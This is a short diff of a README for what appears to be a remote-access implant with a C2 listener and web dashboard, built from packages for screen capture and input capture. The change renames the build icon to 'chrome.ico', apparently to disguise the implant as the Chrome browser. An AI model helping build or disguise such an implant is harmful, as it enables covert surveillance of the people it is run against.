@@ -32,7 +32,7 @@ pip install flask mss pillow opencv-python psutil pynput nuitka ordered-set zsta
 - `implant.py` — implant source
 - `server.py` — C2 listener + web server
 - `dashboard.html` — web panel (must be next to `server.py`)
-- `icon.ico` — icon for the build (optional)
+- `chrome.ico` — icon for the build (optional)
 
 ## Build implant
 Edit `HOST` in `implant.py` if needed (default `192.168.122.1`).
